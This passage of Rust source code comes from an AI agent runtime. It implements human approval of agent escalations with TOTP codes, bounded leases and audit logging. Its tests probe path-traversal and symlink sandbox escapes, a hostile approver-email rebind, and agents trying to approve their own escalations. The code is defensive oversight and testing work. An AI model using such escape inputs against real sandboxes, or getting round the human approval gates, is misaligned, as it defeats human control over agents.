                                    timestamp_ms: Utc::now().timestamp_millis(),
                                    org_id: lease.org_id.clone(),
                                    agent_id: lease.agent_id.clone(),
                                    action: lease.action_pattern.clone(),
                                    resource: lease.resource_pattern.clone(),
                                    policy_decision: format!("revoked:{}:web-console", lease.lease_id),
                                    snapshot_id: None,
                                    details: json!({
                                        "lease_id": lease.lease_id,
                                        "revoked_by": "web-console",
                                    }),
                                    task_id: lease.task_id.clone(),
                                    prev_hash: None,
                                    event_hash: None,
                                })
                                .await;
                            (
                                "HTTP/1.1 200 OK",
                                json!({ "status": "revoked", "lease_id": lease_id, "removed": removed }).to_string(),
                            )
                        } else {
                            (
                                "HTTP/1.1 404 Not Found",
                                json!({ "error": format!("Active lease '{}' not found", lease_id) }).to_string(),
                            )
                        }
                    } else if method == "POST" && full_target.starts_with("/v1/approvals/decide") {
                        let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                        let esc_id = payload
                            .get("escalation_id")
                            .and_then(|v| v.as_str())
                            .unwrap_or("");
                        let decision = payload
                            .get("decision")
                            .and_then(|v| v.as_str())
                            .unwrap_or("approve");
                        let mut ttl_secs = payload
                            .get("ttl_secs")
                            .and_then(|v| v.as_i64())
                            .unwrap_or(0);
                        let mut actor = payload
                            .get("approved_by")
                            .and_then(|v| v.as_str())
                            .unwrap_or("mission-control-dashboard")
                            .to_string();
                        // Tenant approvals: the escalation must belong to the key's org and the
                        // request must carry that org's approver code. Leases stay bounded.
                        let tenant_check: Result<(), String> = if is_operator || auth_mode == DaemonAuth::Disabled {
                            Ok(())
                        } else if let Some(own) = key_org.clone() {
                            let in_org = k
                                .policy
                                .list_escalations(&own)
                                .await
                                .map(|list| list.iter().any(|e| e.escalation_id == esc_id))
                                .unwrap_or(false);
                            let code = payload.get("totp").and_then(|v| v.as_str()).unwrap_or("");
                            if !in_org {
                                Err(format!("Escalation '{}' not found in org '{}'", esc_id, own))
                            } else if code.is_empty() {
                                Err("Approving as a tenant requires the approver's 6-digit code (`totp`)".to_string())
                            } else {
                                match k.paas.verify_approver_code(&own, code).await {
                                    Ok(()) => {
                                        if ttl_secs > 0 {
                                            ttl_secs = ttl_secs.clamp(60, MAX_TOOL_LEASE_TTL_SECS);
                                        } else {
                                            ttl_secs = 0;
                                        }
                                        actor = format!("tenant-approver:{}", own);
                                        Ok(())
                                    }
                                    Err(e) => Err(e.to_string()),
                                }
                            }
                        } else {
                            let found_esc = k
                                .policy
                                .list_escalations("*")
                                .await
                                .unwrap_or_default()
                                .into_iter()
                                .find(|e| e.escalation_id == esc_id);
                            if let Some(esc) = found_esc {
                                let enrolled = k
                                    .paas
                                    .approver_status(&esc.org_id)
                                    .await
                                    .get("enrolled")
                                    .and_then(|v| v.as_bool())
                                    .unwrap_or(false);
                                let code = payload.get("totp").and_then(|v| v.as_str()).unwrap_or("");
                                if enrolled {
                                    if code.is_empty() {
                                        Err("Approving requires your 6-digit authenticator code (`totp`)".to_string())
                                    } else {
                                        match k.paas.verify_approver_code(&esc.org_id, code).await {
                                            Ok(()) => {
                                                if ttl_secs > 0 {
                                                    ttl_secs = ttl_secs.clamp(60, MAX_TOOL_LEASE_TTL_SECS);
                                                } else {
                                                    ttl_secs = 0;
                                                }
                                                actor = format!("tenant-approver:{}", esc.org_id);
                                                Ok(())
                                            }
                                            Err(e) => Err(e.to_string()),
                                        }
                                    }
                                } else if local_addr.ip().is_loopback() {
                                    if ttl_secs > 0 {
                                        ttl_secs = ttl_secs.clamp(60, MAX_TOOL_LEASE_TTL_SECS);
                                    } else {
                                        ttl_secs = 0;
                                    }
                                    actor = format!("web-console:{}", esc.org_id);
                                    Ok(())
                                } else {
                                    Err("Approvals require an operator token or a tenant key with an approver code".to_string())
                                }
                            } else {
                                Err(format!("Escalation '{}' not found", esc_id))
                            }
                        };
                        let actor = actor.as_str();
                        if let Err(reason) = tenant_check {
                            ("HTTP/1.1 403 Forbidden", json!({ "error": reason }).to_string())
                        } else if decision.eq_ignore_ascii_case("deny") || decision.eq_ignore_ascii_case("reject") {
                            match k.policy.deny_escalation(esc_id, actor).await {
                                Ok(esc) => {
                                    let _ = k
                                        .recorder
                                        .record(AuditEvent {
                                            event_id: format!("evt-{}", &Uuid::new_v4().to_string()[..8]),
                                            timestamp_ms: Utc::now().timestamp_millis(),
                                            org_id: esc.org_id.clone(),
                                            agent_id: esc.agent_id.clone(),
                                            action: esc.action.clone(),
                                            resource: esc.target_resource.clone(),
                                            policy_decision: format!("denied:{}:{}", esc.escalation_id, actor),
                                            snapshot_id: None,
                                            details: json!({
                                                "escalation_id": esc.escalation_id,
                                                "denied_by": actor,
                                                "evidence_hash": esc.evidence_hash,
                                            }),
                                            task_id: esc.task_id.clone(),
                                            prev_hash: None,
                                            event_hash: None,
                                        })
                                        .await;
                                    (
                                        "HTTP/1.1 200 OK",
                                        json!({ "status": "denied", "escalation": esc }).to_string(),
                                    )
                                }
                                Err(e) => (
                                    "HTTP/1.1 404 Not Found",
                                    json!({ "error": e.to_string() }).to_string(),
                                ),
                            }
                        } else {
                            match k.policy.approve_escalation(esc_id, ttl_secs, actor).await {
                                Ok(lease) => {
                                    let _ = k
                                        .recorder
                                        .record(AuditEvent {
                                            event_id: format!("evt-{}", &Uuid::new_v4().to_string()[..8]),
                                            timestamp_ms: Utc::now().timestamp_millis(),
                                            org_id: lease.org_id.clone(),
                                            agent_id: lease.agent_id.clone(),
                                            action: lease.action_pattern.clone(),
                                            resource: lease.resource_pattern.clone(),
                                            policy_decision: format!("approved:{}:{}:{}", esc_id, lease.lease_id, actor),
                                            snapshot_id: None,
                                            details: json!({
                                                "escalation_id": esc_id,
                                                "lease_id": lease.lease_id,
                                                "approved_by": actor,
                                                "ttl_secs": ttl_secs,
                                                "resource_pattern": lease.resource_pattern,
                                            }),
                                            task_id: lease.task_id.clone(),
                                            prev_hash: None,
                                            event_hash: None,
                                        })
                                        .await;
                                    (
                                        "HTTP/1.1 200 OK",
                                        json!({ "status": "approved", "lease": lease }).to_string(),
                                    )
                                }
                                Err(e) => (
                                    "HTTP/1.1 404 Not Found",
                                    json!({ "error": e.to_string() }).to_string(),
                                ),
                            }
                        }
                    } else if method == "POST" && full_target.starts_with("/v1/approvals/simulate") {
                        let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
                        let s_org = payload
                            .get("org_id")
                            .and_then(|v| v.as_str())
                            .filter(|s| !s.is_empty() && *s != "*")
                            .unwrap_or("aegis-os");
                        let s_agent = payload
                            .get("agent_id")
                            .and_then(|v| v.as_str())
                            .filter(|s| !s.is_empty())
                            .unwrap_or("coder-alpha");
                        let s_action = payload
                            .get("action")
                            .and_then(|v| v.as_str())
                            .filter(|s| !s.is_empty())
                            .unwrap_or("workspace_commit");
                        let s_files: Vec<String> = payload
                            .get("files")
                            .and_then(|v| serde_json::from_value(v.clone()).ok())
                            .unwrap_or_else(|| {
                                vec![
                                    "src/payment_engine.rs".to_string(),
                                    "tests/idempotency_test.rs".to_string(),
                                ]
                            });
                        let mut ctx = PolicyContext {
                            principal: AgentIdentity::new(s_org, s_agent, "Aegis Cloud Agent"),
                            action: s_action.to_string(),
                            target_org_id: s_org.to_string(),
                            target_resource: "/workspace".to_string(),
                            metadata: json!({
                                "paths": s_files,
                                "host_root": bound_ws_path.display().to_string(),
                                "simulated": true
                            }),
                        };
                        let mut decision = k.policy.evaluate(&ctx).await;
                        if matches!(decision, Ok(PolicyDecision::Allow { .. })) {
                            // If `s_agent` already holds an active lease, suffix a fresh instance ID so the demo button always produces a pending escalation.
                            let fresh_agent = format!("{}-{}", s_agent, &Uuid::new_v4().to_string()[..4]);
                            ctx.principal = AgentIdentity::new(s_org, &fresh_agent, "Aegis Cloud Agent");
                            decision = k.policy.evaluate(&ctx).await;
                        }
                        match decision {
                            Ok(PolicyDecision::Ask {
                                escalation_id,
                                reason,
                                suggested_lease_scope,
                            }) => (
                                "HTTP/1.1 200 OK",
                                json!({
                                    "status": "simulated",
                                    "escalation_id": escalation_id,
                                    "reason": reason,
                                    "suggested_lease_scope": suggested_lease_scope
                                })
                                .to_string(),
                            ),
                            Ok(other) => (
                                "HTTP/1.1 200 OK",
                                json!({ "status": "evaluated", "decision": other }).to_string(),
                            ),
                            Err(e) => (
                                "HTTP/1.1 500 Internal Server Error",
                                json!({ "error": e.to_string() }).to_string(),
                            ),
                        }
                    } else if method == "POST"
                        && (full_target.starts_with("/mcp")
                            || full_target.starts_with("/v1/mcp")
                            || full_target.starts_with("/a2a")
                            || full_target.starts_with("/v1/a2a"))
                    {
                        if let Some(ref ws_id) = bound_ws_id {
                            let _ = k.paas.wake_workspace_if_needed(&k, &org_id, ws_id).await;
                        }
                        let identity = AgentIdentity::new(org_id.clone(), agent_id, role);
                        let call_started = std::time::Instant::now();
                        match serde_json::from_str::<Value>(body_str.trim()) {
                            Ok(mut rpc_req) => {
                                let rpc_method = rpc_req
                                    .get("method")
                                    .and_then(|v| v.as_str())
                                    .unwrap_or("")
                                    .to_string();
                                let tool_name = rpc_req
                                    .get("params")
                                    .and_then(|p| p.get("name"))
                                    .and_then(|v| v.as_str())
                                    .unwrap_or(&rpc_method)
                                    .to_string();

                                // Enforce commercial paywall quotas (`max_concurrent_agents`, `max_daily_syscalls`, `max_daily_exec_ms`)
                                // on tool invocations BEFORE allocating CoW shadow workspaces or spawning sandbox processes.
                                let paywall_check = if rpc_method == "tools/call"
                                    || rpc_method == "tasks/send"
                                    || rpc_method == "message/send"
                                {
                                    k.paas
                                        .check_and_enforce_paywall(
                                            &org_id,
                                            &identity.agent_id,
                                            &tool_name,
                                        )
                                        .await
                                } else {
                                    Ok(k.paas.get_tenant_plan(&org_id).await)
                                };

                                match paywall_check {
                                    Err(paywall_err) => {
                                        if headers
                                            .get("x-aegis-paywall-mode")
                                            .map(|s| s.as_str())
                                            == Some("http-402")
                                        {
                                            ("HTTP/1.1 402 Payment Required", paywall_err.to_string())
                                        } else {
                                            let req_id =
                                                rpc_req.get("id").cloned().unwrap_or(Value::Null);
                                            let notice = paywall_err
                                                .get("agent_notice")
                                                .and_then(|v| v.as_str())
                                                .unwrap_or("Aegis Cloud Paywall quota exceeded.");
                                            (
                                                "HTTP/1.1 200 OK",
                                                json!({
                                                    "jsonrpc": "2.0",
                                                    "id": req_id,
                                                    "result": {
                                                        "isError": true,
                                                        "paywall": paywall_err,
                                                        "content": [{
                                                            "type": "text",
                                                            "text": notice
                                                        }]
                                                    }
                                                })
                                                .to_string(),
                                            )
                                        }
                                    }
                                    Ok(tier) => {
                                        let _ = k
                                            .ensure_agent_environment(
                                                identity.clone(),
                                                &bound_ws_path,
                                                IsolationTier::NativeOsSandbox,
                                                vec!["*".to_string()],
                                            )
                                            .await;
                                        // Enforce per-tier `max_exec_timeout_ms` on remote `proc_exec` calls
                                        let max_timeout = tier.max_exec_timeout_ms();
                                        if let Some(params) = rpc_req.get_mut("params") {
                                            if params.get("name").and_then(|v| v.as_str())
                                                == Some("proc_exec")
                                            {
                                                if let Some(args) = params
                                                    .get_mut("arguments")
                                                    .and_then(|v| v.as_object_mut())
                                                {
                                                    let req_t = args
                                                        .get("timeout_ms")
                                                        .and_then(|v| v.as_u64())
                                                        .unwrap_or(max_timeout);
                                                    args.insert(
                                                        "timeout_ms".to_string(),
                                                        json!(req_t.min(max_timeout)),
                                                    );
                                                }
                                            }
                                        }
                                        match k.handle_jsonrpc_message(&identity, rpc_req).await {
                                            Ok(rpc_resp) => {
                                                let elapsed_ms =
                                                    call_started.elapsed().as_millis() as u64;
                                                let _ = k
                                                    .paas
                                                    .record_usage(
                                                        &org_id,
                                                        bound_ws_id.as_deref(),
                                                        1,
                                                        elapsed_ms,
                                                        0,
                                                    )
                                                    .await;
                                                ("HTTP/1.1 200 OK", rpc_resp.to_string())
                                            }
                                            Err(e) => (
                                                "HTTP/1.1 500 Internal Server Error",
                                                json!({ "error": e.to_string() }).to_string(),
                                            ),
                                        }
                                    }
                                }
                            }
                            Err(e) => (
                                "HTTP/1.1 400 Bad Request",
                                json!({ "error": format!("Invalid JSON-RPC payload: {}", e) }).to_string(),
                            ),
                        }
                    } else {
                        ("HTTP/1.1 404 Not Found", json!({ "error": "Not found" }).to_string())
                    };

                    let http_resp = format!(
                        "{status_line}\r\nContent-Type: {content_type}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{resp_body}",
                        resp_body.len()
                    );
                    let _ = stream.write_all(http_resp.as_bytes()).await;
                });
            }
        });

        Ok(local_addr)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shadow_paths_reject_traversal() {
        let tmp = tempfile::tempdir().unwrap();
        let (shadow, host) = (tmp.path().join("shadow"), tmp.path().join("host"));
        std::fs::create_dir_all(&shadow).unwrap();
        std::fs::create_dir_all(&host).unwrap();
        for bad in ["../x", "a/../../x", "", "/", "./"] {
            assert!(shadow_path_for_write(&shadow, bad).is_err(), "{bad}");
            assert!(shadow_path_for_read(&shadow, &host, bad).is_err(), "{bad}");
        }
        // Repo-absolute paths and names merely containing ".." stay allowed.
        let (clean, full) = shadow_path_for_write(&shadow, "/src/a..b.rs").unwrap();
        assert_eq!(clean, "src/a..b.rs");
        assert_eq!(full, shadow.join("src/a..b.rs"));
    }

    #[tokio::test]
    async fn http_daemon_rejects_oversized_bodies() {
        let temp = tempfile::tempdir().unwrap();
        let repo = temp.path().join("repo");
        tokio::fs::create_dir_all(&repo).await.unwrap();
        let kernel = Arc::new(AegisRuntimeKernel::new(&temp.path().join("rt")).await.unwrap());
        let addr = kernel.start_http_daemon("127.0.0.1:0", repo).await.unwrap();

        let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();
        let req = format!(
            "POST /mcp HTTP/1.1\r\nHost: {addr}\r\nContent-Length: {}\r\n\r\n{{",
            MAX_HTTP_BODY_BYTES + 1
        );
        stream.write_all(req.as_bytes()).await.unwrap();
        let mut resp = Vec::new();
        tokio::io::AsyncReadExt::read_to_end(&mut stream, &mut resp).await.unwrap();
        assert!(String::from_utf8_lossy(&resp).starts_with("HTTP/1.1 413"));
    }

    #[test]
    fn every_mcp_tool_declares_all_four_annotation_hints() {
        let schema = AegisRuntimeKernel::mcp_tools_schema();
        let tools = schema["tools"].as_array().unwrap();
        let names: Vec<&str> = tools.iter().map(|t| t["name"].as_str().unwrap()).collect();
        for tool in tools {
            for hint in ["readOnlyHint", "destructiveHint", "idempotentHint", "openWorldHint"] {
                assert!(
                    tool["annotations"][hint].is_boolean(),
                    "{} lacks a boolean {hint}",
                    tool["name"]
                );
            }
            if tool["annotations"]["readOnlyHint"] == true {
                assert_eq!(tool["annotations"]["destructiveHint"], false, "{}", tool["name"]);
            }
        }
        for (name, ..) in TOOL_ANNOTATIONS {
            assert!(names.contains(name), "annotation for unknown tool {name}");
        }
    }

    async fn raw_http(addr: std::net::SocketAddr, method: &str, path: &str, auth: Option<&str>, body: Option<Value>) -> (String, Value) {
        let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();
        let body_str = body.map(|b| b.to_string()).unwrap_or_default();
        let auth_hdr = auth.map(|a| format!("Authorization: Bearer {a}\r\n")).unwrap_or_default();
        let req = format!(
            "{method} {path} HTTP/1.1\r\nHost: {addr}\r\n{auth_hdr}Content-Length: {}\r\n\r\n{body_str}",
            body_str.len()
        );
        stream.write_all(req.as_bytes()).await.unwrap();
        let mut buf = Vec::new();
        tokio::io::AsyncReadExt::read_to_end(&mut stream, &mut buf).await.unwrap();
        let raw = String::from_utf8_lossy(&buf).to_string();
        let (head, b) = raw.split_once("\r\n\r\n").unwrap_or((&raw, "{}"));
        let parsed = serde_json::from_str::<Value>(b).unwrap_or_else(|_| json!({ "html": b }));
        (head.to_string(), parsed)
    }

    fn code_for(secret_b32: &str, step_offset: i64) -> String {
        // Decode RFC 4648 base32 (test-only; the server stores raw bytes).
        let mut bits = 0u32;
        let mut buf = 0u32;
        let mut bytes = Vec::new();
        for c in secret_b32.bytes() {
            let v = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567".iter().position(|x| *x == c).unwrap() as u32;
            buf = (buf << 5) | v;
            bits += 5;
            if bits >= 8 {
                bytes.push((buf >> (bits - 8)) as u8);
                bits -= 8;
            }
        }
        let step = approver::totp_step(chrono::Utc::now().timestamp()) + step_offset;
        format!("{:06}", approver::hotp(&bytes, step as u64))
    }

    #[tokio::test]
    async fn tenant_approver_enrolls_by_email_and_approves_with_totp() {
        let temp = tempfile::tempdir().unwrap();
        let repo = temp.path().join("repo");
        tokio::fs::create_dir_all(&repo).await.unwrap();
        let outbox = temp.path().join("outbox");
        let kernel = Arc::new(AegisRuntimeKernel::new(&temp.path().join("rt")).await.unwrap());
        kernel.paas.set_mailer(approver::Mailer::Directory(outbox.clone()), "https://cloud.example/aegis-cloud");
        let addr = kernel.clone().start_http_daemon("127.0.0.1:0", repo).await.unwrap();
        let op = kernel.operator_token();
        let (acme_key, _) = kernel.paas.issue_api_key("acme", "coder", "Engineer", None, "test").await.unwrap();
        let (other_key, _) = kernel.paas.issue_api_key("other", "coder", "Engineer", None, "test").await.unwrap();

        let simulate = |org: &'static str| {
            let op = op.clone();
            async move {
                let (_, v) = raw_http(addr, "POST", "/v1/approvals/simulate", Some(&op), Some(json!({ "org_id": org, "agent_id": "coder" }))).await;
                v["escalation_id"].as_str().unwrap().to_string()
            }
        };
        let esc1 = simulate("acme").await;

        // Without an approver, a tenant key cannot approve, code or not.
        let (head, _) = raw_http(addr, "POST", "/v1/approvals/decide", Some(&acme_key), Some(json!({ "escalation_id": esc1 }))).await;
        assert!(head.contains("403"), "{head}");
        let (head, _) = raw_http(addr, "POST", "/v1/approvals/decide", Some(&acme_key), Some(json!({ "escalation_id": esc1, "totp": "123456" }))).await;
        assert!(head.contains("403"), "{head}");

        // Enrollment is mailed; the API response never contains the link or secret.
        let (head, resp) = raw_http(addr, "POST", "/v1/approver/email", Some(&acme_key), Some(json!({ "email": "Lead@Acme.dev" }))).await;
        assert!(head.contains("200 OK"), "{head} {resp}");
        assert!(!resp.to_string().contains("aet_"));
        let mail = std::fs::read_dir(&outbox).unwrap().next().unwrap().unwrap().path();
        let mail = std::fs::read_to_string(mail).unwrap();
        assert!(mail.starts_with("To: lead@acme.dev"));
        let token = mail.split("token=").nth(1).unwrap().split_whitespace().next().unwrap().to_string();
        assert!(mail.contains("https://cloud.example/aegis-cloud/approver/enroll?token="));

        // Opening the link changes nothing; pressing the button issues the secret exactly once.
        let (head, page) = raw_http(addr, "GET", &format!("/approver/enroll?token={token}"), None, None).await;
        assert!(head.contains("200 OK") && page["html"].as_str().unwrap().contains("Enroll my authenticator"));
        assert_eq!(kernel.paas.approver_status("acme").await["enrolled"], false);
        let (head, enrolled) = raw_http(addr, "POST", "/approver/enroll", None, Some(json!({ "token": token }))).await;
        assert!(head.contains("200 OK"), "{head} {enrolled}");
        assert_eq!(enrolled["org_id"], "acme");
        assert!(enrolled["qr_svg"].as_str().unwrap().contains("<svg"));
        let secret = enrolled["secret"].as_str().unwrap().to_string();
        let (head, _) = raw_http(addr, "POST", "/approver/enroll", None, Some(json!({ "token": token }))).await;
        assert!(head.contains("400"), "{head}");
        let (_, status) = raw_http(addr, "GET", "/v1/approver", Some(&acme_key), None).await;
        assert_eq!(status["enrolled"], true);
        assert_eq!(status["email"], "l***@acme.dev");

        // Later links can only go to the bound address.
        let (head, _) = raw_http(addr, "POST", "/v1/approver/email", Some(&acme_key), Some(json!({ "email": "agent@evil.dev" }))).await;
        assert!(head.contains("400"), "{head}");

        // Wrong code is refused; the right code approves with a bounded lease.
        let (head, _) = raw_http(addr, "POST", "/v1/approvals/decide", Some(&acme_key), Some(json!({ "escalation_id": esc1, "totp": "000000" }))).await;
        assert!(head.contains("403"), "{head}");
        let code = code_for(&secret, 0);
        let (head, resp) = raw_http(addr, "POST", "/v1/approvals/decide", Some(&acme_key), Some(json!({ "escalation_id": esc1, "totp": code, "ttl_secs": 0 }))).await;
        assert!(head.contains("200 OK"), "{head} {resp}");
        assert_eq!(resp["status"], "approved");
        assert!(resp["lease"]["expires_at_ms"].as_i64().unwrap() > 0, "tenant leases are never permanent: {resp}");

        // A used code cannot be replayed, and another org's escalation is out of reach.
        let esc2 = simulate("acme").await;
        let (head, resp) = raw_http(addr, "POST", "/v1/approvals/decide", Some(&acme_key), Some(json!({ "escalation_id": esc2, "totp": code }))).await;
        assert!(head.contains("403") && resp["error"].as_str().unwrap().contains("already used"), "{head} {resp}");
        let foreign = simulate("other").await;
        let (head, _) = raw_http(addr, "POST", "/v1/approvals/decide", Some(&acme_key), Some(json!({ "escalation_id": foreign, "totp": code_for(&secret, 1) }))).await;
        assert!(head.contains("403"), "{head}");
        let (head, _) = raw_http(addr, "POST", "/v1/approvals/decide", Some(&other_key), Some(json!({ "escalation_id": esc2, "totp": code_for(&secret, 1) }))).await;
        assert!(head.contains("403"), "{head}");

        // Tenants cannot reset approvers; the operator can.
        let (head, _) = raw_http(addr, "DELETE", "/v1/approver", Some(&acme_key), None).await;
        assert!(head.contains("403"), "{head}");
        let (head, resp) = raw_http(addr, "DELETE", "/v1/approver?org_id=acme", Some(&op), None).await;
        assert!(head.contains("200 OK") && resp["removed"] == true, "{head} {resp}");

        // Only the operator can delete an org; afterwards its keys no longer authenticate.
        let (head, _) = raw_http(addr, "DELETE", "/v1/orgs?org_id=acme", Some(&acme_key), None).await;
        assert!(head.contains("403"), "{head}");
        let (head, resp) = raw_http(addr, "DELETE", "/v1/orgs?org_id=acme", Some(&op), None).await;
        assert!(head.contains("200 OK") && resp["status"] == "deleted", "{head} {resp}");
        assert_eq!(resp["removed"]["api_keys"], 1, "{resp}");
        let (head, _) = raw_http(addr, "GET", "/v1/approver", Some(&acme_key), None).await;
        assert!(head.contains("401"), "{head}");
        let (_, resp) = raw_http(addr, "DELETE", "/v1/orgs?org_id=acme", Some(&op), None).await;
        assert_eq!(resp["status"], "not_found", "{resp}");
        let (head, _) = raw_http(addr, "DELETE", "/v1/orgs?org_id=*", Some(&op), None).await;
        assert!(head.contains("400"), "{head}");
    }

    #[tokio::test]
    async fn approver_lockout_after_repeated_wrong_codes() {
        let temp = tempfile::tempdir().unwrap();
        let kernel = AegisRuntimeKernel::new(&temp.path().join("rt")).await.unwrap();
        kernel.paas.set_mailer(approver::Mailer::Directory(temp.path().join("outbox")), "https://x.example");
        kernel.paas.request_approver_email_enrollment("acme", "a@acme.dev").await.unwrap();
        let mail = std::fs::read_dir(temp.path().join("outbox")).unwrap().next().unwrap().unwrap().path();
        let token = std::fs::read_to_string(mail).unwrap().split("token=").nth(1).unwrap().split_whitespace().next().unwrap().to_string();
        let enrolled = kernel.paas.confirm_approver_email_enrollment(&token).await.unwrap();
        let secret = enrolled["secret"].as_str().unwrap().to_string();
        for _ in 0..5 {
            assert!(kernel.paas.verify_approver_code("acme", "000000").await.is_err());
        }
        let err = kernel.paas.verify_approver_code("acme", &code_for(&secret, 0)).await.unwrap_err();
        assert!(err.to_string().contains("locked"), "{err}");
    }

    #[tokio::test]
    async fn memory_policy_evaluate_asks_then_allows_after_approval() {
        let temp = tempfile::tempdir().unwrap();
        let kernel = AegisRuntimeKernel::new(&temp.path().join("rt"))
            .await
            .unwrap();
        let agent = AgentIdentity::new("local", "claude-desktop", "Memory Reader");

        let call = |id: u64, resource: &str| {
            json!({
                "jsonrpc": "2.0",
                "id": id,
                "method": "tools/call",
                "params": {
                    "name": "memory_policy_evaluate",
                    "arguments": { "action": "read", "resource": resource }
                }
            })
        };

        let resp = kernel
            .handle_jsonrpc_message(&agent, call(1, "memory:tag:notes/projects"))
            .await
            .unwrap();
        let payload: Value = serde_json::from_str(
            resp["result"]["content"][0]["text"]
                .as_str()
                .expect("tool result text"),
        )
        .unwrap();
        assert_eq!(payload["decision"], "ask");
        let escalation_id = payload["escalation_id"]
            .as_str()
            .expect("escalation id")
            .to_string();

        kernel
            .policy
            .approve_escalation(&escalation_id, 1800, "user")
            .await
            .unwrap();

        let resp = kernel
            .handle_jsonrpc_message(&agent, call(2, "memory:tag:notes/projects"))
            .await
            .unwrap();
        let payload: Value = serde_json::from_str(
            resp["result"]["content"][0]["text"]
                .as_str()
                .expect("tool result text"),
        )
        .unwrap();
        assert_eq!(payload["decision"], "allow");

        // A tag lease must not authorize a different tag.
        let resp = kernel
            .handle_jsonrpc_message(&agent, call(3, "memory:tag:notes/journal"))
            .await
            .unwrap();
        let payload: Value = serde_json::from_str(
            resp["result"]["content"][0]["text"]
                .as_str()
                .expect("tool result text"),
        )
        .unwrap();
        assert_eq!(payload["decision"], "ask");
    }

    #[tokio::test]
    async fn agents_cannot_grant_leases_or_approve_escalations_over_mcp() {
        let temp = tempfile::tempdir().unwrap();
        let kernel = AegisRuntimeKernel::new(&temp.path().join("rt")).await.unwrap();
        let agent = AgentIdentity::new("acme", "coder-1", "Engineer");

        let list = kernel
            .handle_jsonrpc_message(&agent, json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/list" }))
            .await
            .unwrap();
        let names: Vec<&str> = list["result"]["tools"]
            .as_array()
            .unwrap()
            .iter()
            .filter_map(|t| t["name"].as_str())
            .collect();
        assert!(names.contains(&"policy_list_escalations"));
        for tool in HUMAN_ONLY_TOOLS {
            assert!(!names.contains(tool), "{tool} must not be advertised to agents");
            let resp = kernel
                .handle_jsonrpc_message(
                    &agent,
                    json!({
                        "jsonrpc": "2.0",
                        "id": 2,
                        "method": "tools/call",
                        "params": { "name": tool, "arguments": { "escalation_id": "esc-x", "action_pattern": "*" } }
                    }),
                )
                .await
                .unwrap();
            assert_eq!(resp["result"]["isError"], true, "{tool}");
            assert!(resp["result"]["content"][0]["text"]
                .as_str()
                .unwrap()
                .contains("reserved for the human operator"));
        }
        let leases = kernel.policy.list_leases("acme", None).await.unwrap();
        assert!(leases.is_empty(), "no lease may be minted via MCP");
    }

    #[cfg(unix)]
    #[test]
    fn shadow_paths_refuse_symlink_escapes() {
        use std::os::unix::fs::symlink;
        let tmp = tempfile::tempdir().unwrap();
        let (shadow, host, outside) = (
            tmp.path().join("shadow"),
            tmp.path().join("host"),
            tmp.path().join("outside"),
        );
        for d in [&shadow, &host, &outside] {
            std::fs::create_dir_all(d).unwrap();
        }
        std::fs::write(outside.join("secret"), "s").unwrap();
        std::fs::write(host.join("dep.js"), "d").unwrap();
        symlink(outside.join("secret"), shadow.join("rc")).unwrap();
        symlink(&outside, shadow.join("out")).unwrap();
        symlink(&host, shadow.join("node_modules")).unwrap();

        // Writes never go through a symlink, whether it is the leaf or a parent directory.
        assert!(shadow_path_for_write(&shadow, "rc").is_err());
        assert!(shadow_path_for_write(&shadow, "out/new.txt").is_err());
        assert!(shadow_path_for_write(&shadow, "node_modules/dep.js").is_err());
        assert!(shadow_path_for_write(&shadow, "fresh/dir/file.txt").is_ok());

        // Reads may follow links into the host repo, never elsewhere.
        assert!(shadow_path_for_read(&shadow, &host, "rc").is_err());
        assert!(shadow_path_for_read(&shadow, &host, "out/secret").is_err());
        assert!(shadow_path_for_read(&shadow, &host, "node_modules/dep.js").is_ok());
    }

    #[tokio::test]
    async fn test_end_to_end_multi_agent_ipc_and_cow_workflow() {
        let temp = tempfile::tempdir().unwrap();
        let host_project = temp.path().join("host_repo");
        let runtime_root = temp.path().join("aegis_runtime");

        tokio::fs::create_dir_all(&host_project).await.unwrap();
        tokio::fs::write(host_project.join("lib.rs"), "pub fn version() -> u32 { 1 }\n")
            .await
            .unwrap();

        let kernel = AegisRuntimeKernel::new(&runtime_root).await.unwrap();

        let researcher = AgentIdentity::new("acme", "researcher-1", "Security Researcher")
            .with_capabilities(vec!["audit".to_string()]);
        let coder = AgentIdentity::new("acme", "coder-1", "Rust Engineer")
            .with_capabilities(vec!["code".to_string(), "test".to_string()]);

        kernel
            .ensure_agent_environment(
                researcher.clone(),
                &host_project,
                IsolationTier::NativeOsSandbox,
                vec!["releases".to_string()],
            )
            .await
            .unwrap();

        kernel
            .ensure_agent_environment(
                coder.clone(),
                &host_project,
                IsolationTier::NativeOsSandbox,
                vec!["tasks".to_string()],
            )
            .await
            .unwrap();

        let pub_res = kernel
            .call_tool(
                &researcher,
                "org_artifact_publish",
                json!({
                    "name": "upgrade_spec.json",
                    "content": "{\"target_version\": 2}",
                    "content_type": "application/json"
                }),
            )
            .await
            .unwrap();
        let artifact_uri = pub_res.get("uri").unwrap().as_str().unwrap().to_string();

        let req_res = kernel
            .call_tool(
                &researcher,
                "ipc_request",
                json!({
                    "to_agent": "coder-1",
                    "subject": "Bump library version to 2",
                    "payload": { "instructions": "Follow attached spec" },
                    "attachments": [artifact_uri]
                }),
            )
            .await
            .unwrap();
        let req_msg_id = req_res.get("msg_id").unwrap().as_str().unwrap().to_string();

        let inbox_res = kernel
            .call_tool(&coder, "ipc_recv", json!({ "unread_only": true }))
            .await
            .unwrap();
        assert_eq!(inbox_res["messages_count"], 1);

        // Surgical edit via `fs_edit` inside CoW workspace
        kernel
            .call_tool(
                &coder,
                "fs_edit",
                json!({
                    "path": "lib.rs",
                    "target": "pub fn version() -> u32 { 1 }",
                    "replacement": "pub fn version() -> u32 { 2 }"
                }),
            )
            .await
            .unwrap();

        let researcher_read = kernel
            .call_tool(&researcher, "fs_read", json!({ "path": "lib.rs" }))
            .await
            .unwrap();
        assert_eq!(
            researcher_read["content"].as_str().unwrap(),
            "pub fn version() -> u32 { 1 }\n"
        );

        let commit_attempt = kernel
            .call_tool(&coder, "workspace_commit", json!({}))
            .await
            .unwrap();
        assert_eq!(commit_attempt["status"], "approval_required");
        let esc_id = commit_attempt["escalation_id"].as_str().unwrap().to_string();

        // Approve the escalation directly via `policy_approve_escalation`
        kernel
            .call_tool(
                &coder,
                "policy_approve_escalation",
